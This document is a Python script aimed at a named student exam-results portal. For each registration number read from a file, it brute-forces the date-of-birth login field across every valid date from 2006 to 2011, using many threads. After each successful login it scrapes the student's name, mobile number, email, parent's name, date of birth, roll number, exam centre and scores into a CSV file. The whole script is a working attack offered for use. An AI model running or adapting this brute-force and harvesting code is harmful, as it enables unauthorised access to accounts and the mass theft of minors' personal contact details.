from bs4 import BeautifulSoup
import requests
import re
import threading
from concurrent.futures import ThreadPoolExecutor
import os
import csv
from datetime import datetime

url1 = "https://iapt.manageexam.com/Student/Login"
url2 = "https://iapt.manageexam.com/Student/Application/ScoreCard"
url3 = "https://iapt.manageexam.com/Student/Application/JSscorecard"
detail_keys = {
    "regno",
    "Name",
    "Mobile",
    "Email",
    "name",
    "parent_name",
    "gender",
    "class_standard",
    "roll_no",
    "date_of_birth",
    "exam_center",
}
score_keys = ["NSEA", "NSEB", "NSEC", "NSEP", "NSEJS"]
output_fields = [
    "regno",
    "Name",
    "Mobile",
    "Email",
    "name",
    "parent_name",
    "gender",
    "class_standard",
    "roll_no",
    "date_of_birth",
    "exam_center",
    *score_keys,
]
def extract_student_details(html_content):
    soup = BeautifulSoup(html_content, 'html.parser')
    def get_label_value(label_text):
        label_element = soup.find("h4", string=lambda text: text and label_text in text)
        if label_element:
            sibling = label_element.find_next("label")
            return sibling.text.strip() if sibling else None
        return None
    details = {
        "name": get_label_value("Name"),
        "parent_name": get_label_value("Father/Mother"),
        "gender": get_label_value("Gender"),
        "class_standard": get_label_value("Class/Standard"),
        "roll_no": get_label_value("Roll No."),
        "date_of_birth": get_label_value("Date of Birth"),
        "exam_center": get_label_value("Appeared at centre"),
    }
    soup = BeautifulSoup(html_content, 'html.parser')
    soup = soup.find('div', class_='col-sm-12', style="padding-bottom: 20px;")
    scores = {}
    if soup:
        subjects_column = soup.find("div", class_="col-sm-4") or soup.find("div", class_="col-sm-5")
        score_columns = soup.find_all("div", class_="col-sm-2")
        scores_column = score_columns[1] if len(score_columns) > 1 else (score_columns[0] if score_columns else None)
        if subjects_column and scores_column:
            subjects = []
            for label in subjects_column.find_all("label"):
                raw = label.text.strip()
                code_match = re.match(r"^[A-Z]{3,5}", raw)
                subjects.append(code_match.group(0) if code_match else raw.split('(')[0].strip())
            if not subjects:
                for heading in subjects_column.find_all(["h4", "h5"]):
                    raw = heading.text.strip()
                    code_match = re.match(r"^[A-Z]{3,5}", raw)
                    subjects.append(code_match.group(0) if code_match else raw.split('(')[0].strip())
            score_values = [
                label.text.strip() for label in scores_column.find_all("label", style="font-weight: bold;")
            ]
            scores = {subject: score for subject, score in zip(subjects, score_values)}
    combined = {**details, **scores}    
    return combined

def get_email(html_content):
    # Define patterns for extracting name, email, and mobile
    name_pattern = r'Name\s*:</label>\s*<label.*?text-primary.*?>(.*?)</label>'
    mobile_pattern = r'Mobile No\s*:</label>\s*(?:<label.*?>.*?</label>\s*)*?<label.*?text-primary.*?>(\d{10})</label>'
    email_pattern = r'Email Id\s*:</label>\s*<label.*?text-primary.*?>(.*?)</label>'

    # Search for matches
    name_match = re.search(name_pattern, html_content)
    mobile_match = re.search(mobile_pattern, html_content)
    email_match = re.search(email_pattern, html_content)

    # Extract and display results
    extracted_details = {
        "Name": name_match.group(1).strip() if name_match else "Not Found",
        "Mobile": mobile_match.group(1).strip() if mobile_match else "Not Found",
        "Email": email_match.group(1).strip() if email_match else "Not Found",
    }
    return extracted_details

def extract_scores_only(data):
    return {k: v for k, v in data.items() if k not in detail_keys}

def merge_scores(primary, secondary):
    combined = dict(primary)
    for key, value in secondary.items():
        if key not in combined or str(combined[key]).strip().upper() == "NA":
            combined[key] = value
    return combined

def login(regno, dob):
    session = requests.Session()
    response = session.get(url1)
    soup = BeautifulSoup(response.content, 'html.parser')
    token = soup.find("input", {"name": "__RequestVerificationToken"})['value']
    data = {
        "__RequestVerificationToken": token,
        "RegNo": regno,
        "DOB": dob,
    }
    response = session.post(url1, data=data)
    if response.url == url1:
        return False
    
    email = get_email(response.text)
    response = session.get(url2)
    scorecard_html = response.text
    student_details = extract_student_details(scorecard_html)
    scorecard_scores = extract_scores_only(student_details)
    response = session.get(url3)
    if response.status_code == 200:
        js_html = response.text
        js_details = extract_student_details(js_html)
        js_scores = extract_scores_only(js_details)
        if js_details and js_scores:
            if any(k in scorecard_scores for k in ("NSEA", "NSEB", "NSEC", "NSEP")):
                merged_scores = merge_scores(scorecard_scores, js_scores)
                student_details.update(merged_scores)
            else:
                scorecard_html = js_html
                student_details = js_details
    regno_dict = {"regno": regno}
    return {**regno_dict, **email, **student_details}

def scrape(regno):
    for yyyy in [2011,2010,2009,2008,2007,2006]:
        for mm in range(1, 13):
            for dd in range(1, 32):
                try:
                    datetime(yyyy, mm, dd)
                except ValueError:
                    continue
                print(f"trying {dd}/{mm}/{yyyy} {regno}")
                dob = f"{dd:02d}/{mm:02d}/{yyyy}"
                result = login(regno, dob)
                if result:
                    return result
    return None
lock = threading.Lock()
outputfile = "nsep.csv"
existing_regnos = set()
def ensure_output_header():
    if not os.path.exists(outputfile) or os.path.getsize(outputfile) == 0:
        return
    with open(outputfile, newline="") as f:
        reader = csv.reader(f)
        existing_header = next(reader, [])
    if existing_header != output_fields:
        with open(outputfile, newline="") as f:
            rows = list(csv.DictReader(f, restkey="__extra__"))
        with open(outputfile, "w", newline="") as f:
            writer = csv.DictWriter(f, fieldnames=output_fields, extrasaction="ignore")
            writer.writeheader()
            for row in rows:
                row.pop("__extra__", None)
                writer.writerow(row)

def add_result(regno):
    with lock:
        if regno in existing_regnos:
            print(f"Skipping {regno} as it already exists in the file.")
            return
    print(f"Scraping result for {regno}")
    result = scrape(regno)
    with lock:
        if result:
            ensure_output_header()
            write_header = not os.path.exists(outputfile) or os.path.getsize(outputfile) == 0
            row = {field: "" for field in output_fields}
            row.update(result)
            with open(outputfile, "a", newline="") as f:
                writer = csv.DictWriter(f, fieldnames=output_fields, extrasaction="ignore")
                if write_header:
                    writer.writeheader()
                writer.writerow(row)
            existing_regnos.add(regno)
            print(f"Added result for {regno}")
            print(result)
        else:
            print(f"Could not find result for {regno}")
                
if __name__ == "__main__":
    max_workers = int(input("Enter the number of workers: "))
    if os.path.exists(outputfile) and os.path.getsize(outputfile) > 0:
        with open(outputfile, newline="") as f:
            reader = csv.DictReader(f, restkey="__extra__")
            for row in reader:
                regno = row.get("regno")
                if regno:
                    existing_regnos.add(regno)
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        with open("nsep.txt") as f:
            content = f.read()
        pattern = r'([A-Z]{2}\d{9})'
        regnos = re.findall(pattern, content)
        print(regnos)
        futures = []
        for regno in regnos:
            futures.append(executor.submit(add_result, regno))
        for future in futures:
            future.result()
    
